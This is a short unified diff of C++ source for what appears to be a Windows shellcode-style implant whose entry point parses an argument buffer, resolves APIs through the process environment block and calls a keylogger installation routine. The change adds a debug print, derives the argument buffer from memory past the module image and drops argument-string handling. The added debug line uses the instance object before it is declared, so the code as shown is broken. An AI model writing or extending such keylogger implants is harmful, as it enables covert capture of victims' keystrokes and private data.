@@ -436,6 +436,8 @@ auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
 
 EXTERN_C
 auto DECLFN Entry( PVOID Parameter ) -> VOID {
+
+    Instance->Win32.DbgPrint("[+] WE ARE AT ENTRYYYY!");
     PARSER   Psr = { 0 };
     INSTANCE Instance = { 0 };
 
@@ -448,6 +450,8 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;
     Instance.g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = {0};
 
+    Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)((UPTR)Instance.Start + Instance.Size);
+
     LoadEssentials( &Instance );
 
     Parser::New(&Psr, ArgBuffer);
@@ -457,13 +461,8 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
     ULONG Length    = 0;
 
     BYTE* Buffer = Parser::Bytes(&Psr, &Length);
-    CHAR* Arguments = Parser::Str(&Psr);
-    ULONG ArgumentsL = (Str::LengthA(Arguments) + 1) * sizeof(WCHAR);
 
     LoadAdds( &Instance );
-
-    WCHAR wArguments[MAX_PATH * 2] = { 0 };
-    Str::CharToWChar(wArguments, Arguments, ArgumentsL);
     
     Result = KeyloggerInstall();
 
